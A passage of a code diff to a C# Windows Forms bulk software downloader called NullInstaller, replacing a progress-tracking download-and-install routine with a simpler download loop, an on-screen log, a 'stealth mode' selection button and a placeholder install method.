+                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                 return;
             }
-
+            
+            isRunning = true;
+            installButton.Enabled = false;
             downloadButton.Enabled = false;
-            cancellationTokenSource = new CancellationTokenSource();
+            stopButton.Enabled = true;
+            progressBar.Visible = true;
+            progressBar.Maximum = selected.Count;
+            progressBar.Value = 0;
             
-            await DownloadAndInstallPrograms(selectedPrograms);
+            Log($"Starting download of {selected.Count} programs...");
             
-            downloadButton.Enabled = true;
-        }
-
-        private async Task DownloadAndInstallPrograms(List<ProgramEntry> programs)
-        {
-            UpdateStatusLabel($"Processing {programs.Count} program(s)...");
-            overallProgressBar.Maximum = programs.Count * 100;
-            overallProgressBar.Value = 0;
-
-            for (int i = 0; i < programs.Count; i++)
+            foreach (var program in selected)
             {
-                if (cancellationTokenSource.Token.IsCancellationRequested)
-                    break;
-
-                var program = programs[i];
-                var installer = new InstallerItem
-                {
-                    FileName = program.Name,
-                    Status = "Queued",
-                    ProgramEntry = program,
-                    DownloadProgress = 0
-                };
-
-                // Add to list view
-                var item = new ListViewItem(installer.FileName);
-                item.SubItems.Add("Pending");
-                item.SubItems.Add(installer.Status);
-                item.Tag = installer;
-                localFilesList.Items.Add(item);
+                if (!isRunning) break;
                 
-                // Update status to downloading
-                installer.Status = "Downloading";
-                RefreshInstallerDisplay();
-
-                // Download with progress
-                bool downloadSuccess = await DownloadWithProgress(program, installer);
+                UpdateStatus($"Downloading {program.Name}...");
+                Log($"Downloading: {program.Name}");
                 
-                if (downloadSuccess && installer.TempFilePath != null)
+                UpdateItemStatus(program.Name, "Downloading...", Color.Cyan);
+                
+                bool success = await DownloadProgram(program);
+                
+                if (success)
                 {
-                    installer.Status = "Installing";
-                    RefreshInstallerDisplay();
-                    
-                    // Install immediately after download
-                    bool installSuccess = await InstallWithElevation(installer);
-                    
-                    installer.Status = installSuccess ? "Done" : "Failed";
-                    
-                    // Clean up temp file on success
-                    if (installSuccess && File.Exists(installer.TempFilePath))
-                    {
-                        try { File.Delete(installer.TempFilePath); }
-                        catch { /* Ignore cleanup errors */ }
-                    }
+                    UpdateItemStatus(program.Name, "✓ Downloaded", Color.LightGreen);
+                    Log($"✓ Successfully downloaded {program.Name}");
                 }
                 else
                 {
-                    installer.Status = "Failed";
+                    UpdateItemStatus(program.Name, "✗ Failed", Color.LightCoral);
+                    Log($"✗ Failed to download {program.Name}");
                 }
                 
-                RefreshInstallerDisplay();
-                overallProgressBar.Value = (i + 1) * 100;
-            }
-
-            UpdateStatusLabel("Processing complete");
-        }
-
-        private async Task<bool> DownloadWithProgress(ProgramEntry program, InstallerItem installer)
-        {
-            try
-            {
-                string tempDir = Path.Combine(Path.GetTempPath(), "NullInstaller_" + Guid.NewGuid().ToString("N").Substring(0, 8));
-                Directory.CreateDirectory(tempDir);
-                
-                string extension = program.DownloadUrl.Contains(".msi") ? ".msi" : ".exe";
-                string fileName = $"{program.Name.Replace(" ", "_").Replace("/", "_")}{extension}";
-                string filePath = Path.Combine(tempDir, fileName);
-                
-                using (var response = await httpClient.GetAsync(program.DownloadUrl, HttpCompletionOption.ResponseHeadersRead))
-                {
-                    response.EnsureSuccessStatusCode();
-                    
-                    var totalBytes = response.Content.Headers.ContentLength ?? -1L;
-                    installer.Size = totalBytes;
-                    
-                    using (var contentStream = await response.Content.ReadAsStreamAsync())
-                    using (var fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.None, 8192, true))
-                    {
-                        var buffer = new byte[8192];
-                        long totalRead = 0;
-                        int read;
-                        
-                        while ((read = await contentStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
-                        {
-                            await fileStream.WriteAsync(buffer, 0, read);
-                            totalRead += read;
-                            
-                            if (totalBytes > 0)
-                            {
-                                installer.DownloadProgress = (int)((totalRead * 100) / totalBytes);
-                                UpdateStatusLabel($"Downloading {program.Name}: {installer.DownloadProgress}%");
-                            }
-                        }
-                    }
-                }
-                
-                installer.TempFilePath = filePath;
-                installer.FilePath = filePath;
-                LogMessage($"Downloaded {program.Name} to {filePath}");
-                return true;
-            }
-            catch (Exception ex)
-            {
-                LogMessage($"Download failed for {program.Name}: {ex.Message}");
-                return false;
-            }
-        }
-
-        private List<InstallerItem> GetSelectedInstallers()
-        {
-            var selected = new List<InstallerItem>();
-            foreach (ListViewItem item in localFilesList.Items)
-            {
-                if (item.Checked && item.Tag is InstallerItem installer)
-                    selected.Add(installer);
-            }
-            return selected;
-        }
-
-        private List<ProgramEntry> GetSelectedCatalogPrograms()
-        {
-            var selected = new List<ProgramEntry>();
-            foreach (var listView in categoryListViews.Values)
-            {
-                foreach (ListViewItem item in listView.Items)
-                {
-                    if (item.Checked && item.Tag is ProgramEntry program)
-                        selected.Add(program);
-                }
-            }
-            return selected;
-        }
-
-        private void SelectAllButton_Click(object sender, EventArgs e)
-        {
-            if (tabControl.SelectedIndex == 0) // Local Files tab
-            {
-                foreach (ListViewItem item in localFilesList.Items)
-                    item.Checked = true;
-            }
-            else // Software Catalog tab
-            {
-                foreach (var listView in categoryListViews.Values)
-                {
-                    foreach (ListViewItem item in listView.Items)
-                        item.Checked = true;
-                }
-            }
-        }
-
-        private void DeselectAllButton_Click(object sender, EventArgs e)
-        {
-            if (tabControl.SelectedIndex == 0) // Local Files tab
-            {
-                foreach (ListViewItem item in localFilesList.Items)
-                    item.Checked = false;
-            }
-            else // Software Catalog tab
-            {
-                foreach (var listView in categoryListViews.Values)
-                {
-                    foreach (ListViewItem item in listView.Items)
-                        item.Checked = false;
-                }
-            }
-        }
-
-        private void RefreshInstallerDisplay()
-        {
-            if (InvokeRequired)
-            {
-                Invoke(new Action(RefreshInstallerDisplay));
-                return;
+                progressBar.Value++;
             }
             
-            for (int i = 0; i < localFilesList.Items.Count; i++)
-            {
-                if (localFilesList.Items[i].Tag is InstallerItem installer)
-                {
-                    string statusText = installer.Status;
-                    if (installer.IsDownloading && installer.DownloadProgress > 0)
-                    {
-                        statusText = $"Downloading {installer.DownloadProgress}%";
-                    }
-                    
-                    // Update status with icon
-                    switch (installer.Status)
-                    {
-                        case "Done":
-                            statusText = "✔ " + statusText;
-                            localFilesList.Items[i].ForeColor = Color.LightGreen;
-                            break;
-                        case "Failed":
-                            statusText = "✖ " + statusText;
-                            localFilesList.Items[i].ForeColor = Color.LightCoral;
-                            break;
-                        case "Downloading":
-                            localFilesList.Items[i].ForeColor = Color.LightBlue;
-                            break;
-                        case "Installing":
-                            statusText = "⚙ " + statusText;
-                            localFilesList.Items[i].ForeColor = Color.Yellow;
-                            break;
-                        case "Queued":
-                            statusText = "⏳ " + statusText;
-                            localFilesList.Items[i].ForeColor = Color.Gray;
-                            break;
-                    }
-                    
-                    localFilesList.Items[i].SubItems[2].Text = statusText;
-                    
-                    // Update size if known
-                    if (installer.Size > 0 && localFilesList.Items[i].SubItems[1].Text == "Pending")
-                    {
-                        localFilesList.Items[i].SubItems[1].Text = FormatFileSize(installer.Size);
-                    }
-                }
-            }
+            isRunning = false;
+            installButton.Enabled = true;
+            downloadButton.Enabled = true;
+            stopButton.Enabled = false;
+            progressBar.Visible = false;
+            
+            UpdateStatus("Download complete");
+            Log("Download process completed");
         }
-
+        
         private void StopButton_Click(object sender, EventArgs e)
         {
             isRunning = false;
-            UpdateStatusLabel("Installation stopped by user");
+            UpdateStatus("Operation cancelled");
+            Log("Operation cancelled by user");
         }
-
-        private void ClearButton_Click(object sender, EventArgs e)
+        
+        private void SelectAllButton_Click(object sender, EventArgs e)
         {
-            foreach (ListViewItem item in localFilesList.Items)
-            {
+            foreach (ListViewItem item in mainListView.Items)
+                item.Checked = true;
+            UpdateStatus($"Selected {mainListView.Items.Count} items");
+        }
+        
+        private void DeselectAllButton_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem item in mainListView.Items)
                 item.Checked = false;
-                if (item.Tag is InstallerItem installer)
-                    installer.Status = "Ready";
-            }
-            RefreshInstallerDisplay();
-            overallProgressBar.Value = 0;
-            UpdateStatusLabel("All selections cleared");
+            UpdateStatus("All items deselected");
         }
-
-        private void MainForm_DragEnter(object sender, DragEventArgs e)
+        
+        private void StealthModeButton_Click(object sender, EventArgs e)
         {
-            if (e.Data.GetDataPresent(DataFormats.FileDrop))
-                e.Effect = DragDropEffects.Copy;
-        }
-
-        private void MainForm_DragDrop(object sender, DragEventArgs e)
-        {
-            if (e.Data.GetData(DataFormats.FileDrop) is string[] files)
+            // Select stealth mode node
+            foreach (TreeNode node in categoryTree.Nodes)
             {
-                int added = 0;
-                foreach (string file in files)
+                if (node.Tag?.ToString() == "STEALTH")
                 {
-                    if (file.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) ||
-                        file.EndsWith(".msi", StringComparison.OrdinalIgnoreCase))
-                    {
-                        AddInstallerFile(file);
-                        added++;
-                    }
+                    categoryTree.SelectedNode = node;
+                    break;
                 }
-                UpdateStatusLabel($"Added {added} installer file(s) via drag & drop");
             }
+            
+            // Select all stealth items
+            foreach (ListViewItem item in mainListView.Items)
+                item.Checked = true;
+            
+            UpdateStatus("Stealth mode programs selected");
+            Log("Stealth mode activated - privacy tools selected");
         }
-
-        private void UpdateStatusLabel(string message)
+        
+        private List<ProgramEntry> GetSelectedPrograms()
+        {
+            var selected = new List<ProgramEntry>();
+            foreach (ListViewItem item in mainListView.Items)
+            {
+                if (item.Checked && item.Tag is ProgramEntry program)
+                    selected.Add(program);
+            }
+            return selected;
+        }
+        
+        private void UpdateItemStatus(string name, string status, Color color)
         {
             if (InvokeRequired)
             {
-                Invoke(new Action<string>(UpdateStatusLabel), message);
+                Invoke(new Action(() => UpdateItemStatus(name, status, color)));
+                return;
+            }
+            
+            foreach (ListViewItem item in mainListView.Items)
+            {
+                if (item.Text == name)
+                {
+                    item.SubItems[3].Text = status;
+                    item.ForeColor = color;
+                    break;
+                }
+            }
+        }
+        
+        private void UpdateStatus(string message)
+        {
+            if (InvokeRequired)
+            {
+                Invoke(new Action(() => UpdateStatus(message)));
                 return;
             }
             statusLabel.Text = message;
-            LogMessage(message);
         }
-
-        private void InitializeLogging()
+        
+        private void Log(string message)
         {
-            try
+            if (InvokeRequired)
             {
-                logWriter = new StreamWriter("install_log.txt", true);
-                logWriter.WriteLine($"\n=== NullInstaller Started: {DateTime.Now} ===");
-                logWriter.Flush();
+                Invoke(new Action(() => Log(message)));
+                return;
             }
-            catch { /* Ignore logging errors */ }
+            
+            string timestamp = DateTime.Now.ToString("HH:mm:ss");
+            logTextBox.AppendText($"[{timestamp}] {message}\r\n");
+            logTextBox.SelectionStart = logTextBox.Text.Length;
+            logTextBox.ScrollToCaret();
         }
-
-        private void LogMessage(string message)
+        
+        private async Task<bool> InstallProgram(ProgramEntry program)
         {
             try
             {
-                string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}";
-                logWriter?.WriteLine(logEntry);
-                logWriter?.Flush();
+                // Simulate installation
+                await Task.Delay(1000);
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+        
+        private async Task<bool> DownloadProgram(ProgramEntry program)
+        {
+            try
+            {
+                if (string.IsNullOrEmpty(program.DownloadUrl))
+                {
+                    Log($"No download URL for {program.Name}");
+                    return false;
+                }
                 
-                if (verboseLoggingCheck.Checked)
+                // Create temp directory
+                string tempDir = Path.Combine(Path.GetTempPath(), "NullInstaller_Downloads");
+                Directory.CreateDirectory(tempDir);
+                
+                string fileName = $"{program.Name.Replace(" ", "_")}.exe";
+                string filePath = Path.Combine(tempDir, fileName);
+                
+                using (var response = await httpClient.GetAsync(program.DownloadUrl))
                 {
-                    Console.WriteLine(logEntry);
-                }
-            }
-            catch { /* Ignore logging errors */ }
-        }
-
-        private string FormatFileSize(long bytes)
-        {
-            string[] suffixes = { "B", "KB", "MB", "GB" };
-            int counter = 0;
-            decimal number = bytes;
-            while (Math.Round(number / 1024) >= 1)
-            {
-                number /= 1024;
-                counter++;
-            }
-            return $"{number:n1} {suffixes[counter]}";
-        }
-
-        protected override void OnFormClosed(FormClosedEventArgs e)
-        {
-            isRunning = false;
-            cancellationTokenSource?.Cancel();
-            httpClient?.Dispose();
-            logWriter?.Close();
-            
-            // Clean up any remaining temp files
-            CleanupTempFiles();
-            
-            base.OnFormClosed(e);
-        }
-
-        private void CleanupTempFiles()
-        {
-            try
-            {
-                string tempPath = Path.GetTempPath();
-                var tempDirs = Directory.GetDirectories(tempPath, "NullInstaller_*");
-                foreach (var dir in tempDirs)
-                {
-                    try
+                    if (response.IsSuccessStatusCode)
                     {
-                        Directory.Delete(dir, true);
+                        var bytes = await response.Content.ReadAsByteArrayAsync();
+                        await File.WriteAllBytesAsync(filePath, bytes);
+                        Log($"Downloaded to: {filePath}");
+                        return true;
                     }
-                    catch { /* Ignore individual cleanup errors */ }
                 }
+                return false;
             }
-            catch { /* Ignore cleanup errors */ }
+            catch (Exception ex)
+            {
+                Log($"Download error: {ex.Message}");
+                return false;
+            }
         }
     }
-
-    public class InstallerItem
-    {
-        public string FilePath { get; set; }
-        public string FileName { get; set; }
-        public long Size { get; set; }
-        public string Status { get; set; }
-        public ProgramEntry ProgramEntry { get; set; } // Link to catalog entry if downloaded
-        public int DownloadProgress { get; set; }
-        public bool IsDownloading { get; set; }
-        public string TempFilePath { get; set; } // Temporary download path
-    }
-
-    public enum InstallStatus
-    {
-        Queued,
-        Downloading,
-        Installing,
-        Done,
-        Failed
-    }
-
-    // Data models for software catalog
+    
+    // Data models
     public class ProgramEntry
     {
         [JsonPropertyName("name")]
@@ -1125,46 +647,22 @@ namespace NullInstaller
         [JsonPropertyName("silent_switches")]
         public string SilentSwitches { get; set; }
         
-        [JsonPropertyName("needs_reboot")]
-        public bool NeedsReboot { get; set; }
-        
-        [JsonPropertyName("architecture")]
-        public string Architecture { get; set; }
-        
         [JsonPropertyName("vendor")]
         public string Vendor { get; set; }
         
-        [JsonPropertyName("note")]
-        public string Note { get; set; }
+        [JsonPropertyName("version")]
+        public string Version { get; set; }
         
-        [JsonPropertyName("plugins")]
-        public List<string> PluginList { get; set; } // For IDEs with plugins
+        [JsonPropertyName("size")]
+        public string Size { get; set; }
     }
-
+    
     public class SoftwareCatalog
     {
         [JsonPropertyName("software")]
         public List<ProgramEntry> Software { get; set; }
-        
-        [JsonPropertyName("metadata")]
-        public CatalogMetadata Metadata { get; set; }
     }
-
-    public class CatalogMetadata
-    {
-        [JsonPropertyName("version")]
-        public string Version { get; set; }
-        
-        [JsonPropertyName("last_updated")]
-        public string LastUpdated { get; set; }
-        
-        [JsonPropertyName("total_software")]
-        public int TotalSoftware { get; set; }
-        
-        [JsonPropertyName("categories")]
-        public List<string> Categories { get; set; }
-    }
-
+    
     public static class Program
     {
         [STAThread]
